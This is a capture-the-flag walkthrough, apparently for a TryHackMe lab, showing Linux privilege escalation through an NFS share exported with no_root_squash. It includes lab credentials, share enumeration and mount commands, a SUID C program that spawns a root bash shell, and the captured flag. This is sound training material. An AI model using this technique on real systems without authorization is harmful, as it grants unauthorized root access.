Username: karen
Password: Password1


Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.

Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.

NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.
```
$ cat /etc/exports
/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
 - /etc/exports: the access control list for filesystems which may be exported to NFS clients.  See exports(5).
-  Example for NFSv2 and NFSv3:
   - /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,syncno_subtree_check)
- Example for NFSv4:
  - /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
  - /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)

The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

We will start by enumerating mountable shares from our attacking machine.
```
┌─[nguyenlong05@sw1mj3llyf1sh] - [~] - [Wed Jan 22, 22:58]
└─[$] <> showmount -e 10.10.39.162                       
Export list for 10.10.39.162:
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```

> The `*` indicates that these directories are accessible to all clients. This is a significant security risk because it allows any system with NFS capabilities to mount these shares.


We will mount one of the “no_root_squash” shares to our attacking machine and start building our executable.


```
┌─[nguyenlong05@sw1mj3llyf1sh] - [/tmp] - [Wed Jan 22, 23:01]
└─[$] <> mkdir TryHackMe_PrivEsc_nfs 

┌─[nguyenlong05@sw1mj3llyf1sh] - [/tmp] - [Wed Jan 22, 23:03]
└─[$] <> sudo mount -o rw 10.10.39.162:/home/ubuntu/sharedfolder TryHackMe_PrivEsc_nfs
```
As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main (void) {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
```

```
┌─[nguyenlong05@sw1mj3llyf1sh] - [/tmp/TryHackMe_PrivEsc_nfs] - [Wed Jan 22, 23:19]
└─[$] <> sudo gcc -static thm.c -o thm

┌─[nguyenlong05@sw1mj3llyf1sh] - [/tmp/TryHackMe_PrivEsc_nfs] - [Wed Jan 22, 23:20]
└─[$] <> sudo chmod +s thm       

┌─[nguyenlong05@sw1mj3llyf1sh] - [/tmp/TryHackMe_PrivEsc_nfs] - [Wed Jan 22, 23:20]
└─[$] <> sudo chmod +x thm  
```
In the target machine, execute the file and get root
```
$ karen@ip-10-10-39-162:/home/ubuntu/sharedfolder$ ./thm
$ root@ip-10-10-39-162:/home/ubuntu/sharedfolder# 
$ root@ip-10-10-39-162:/home/ubuntu/sharedfolder# cat /home/matt/flag7.txt
THM-89384012
```